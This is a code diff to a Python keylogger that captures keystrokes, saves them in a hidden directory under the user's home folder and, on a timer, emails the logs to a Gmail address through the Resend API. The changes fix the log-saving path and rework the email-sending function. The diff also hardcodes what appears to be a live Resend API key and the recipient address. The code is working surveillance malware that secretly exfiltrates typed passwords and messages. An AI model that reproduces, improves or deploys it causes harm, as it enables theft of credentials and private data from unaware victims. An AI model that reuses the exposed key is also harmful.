@@ -1,13 +1,14 @@
 import os
 import keyboard
-
 from threading import Timer
 from datetime import datetime
 import resend
 
-SEND_REPORT_EVERY = 900 # (in seconds)
+SEND_REPORT_EVERY = 864  # (in seconds)
 
-
+resend.api_key = "re_exusRnQa_Df96cQ2E1VrsRJWomPkt5XUV"
+receiving_Email = "hiowhat090@gmail.com"
+sending_Email = "<onboarding@resend.dev>"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -16,8 +17,6 @@ class Keylogger:
         self.log = ""
         self.start_date = datetime.now()
         self.end_date = datetime.now()
-
-
 
     def key_press(self, event):
         name = event.name
@@ -39,22 +38,20 @@ class Keylogger:
         self.filename = f'keylog - {start_date_str}_{end_date_str}'
 
     def save(self):
-        os.mkdir("/home/owhat/.key/logs")
-        with open(f"/home/owhat/.key/logs", "w") as f:
+        os.makedirs("/home/owhat/.key/logs", exist_ok=True)
+        with open(f"/home/owhat/.key/logs/{self.filename}.txt", "w") as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
         return self.log
 
-    def sendmail(self):
+    def sendmail(self, sending_Email, receving_Email):
         message = self.save()
-
-
-        resend.api_key = "re_exusRnQa_Df96cQ2E1VrsRJWomPkt5XUV"
+        title = self.filename
 
         params: resend.Emails.SendParams = {
-            "from": "Acme <onboarding@resend.dev>",
-            "to": "hiowhat090@gmail.com",
-            "subject": "hello world",
+            "from": f"Acme {sending_Email}",
+            "to": receving_Email,
+            "subject": title,
             "html": f"<strong>{message}</strong>",
         }
 
@@ -66,7 +63,7 @@ class Keylogger:
             self.end_date = datetime.now()
             self.create_filename()
             if self.report_method == "email":
-                self.sendmail()
+                self.sendmail(sending_Email, receiving_Email)
 
             print(f"[{self.filename}] - {self.log}")
             self.start_date = datetime.now()
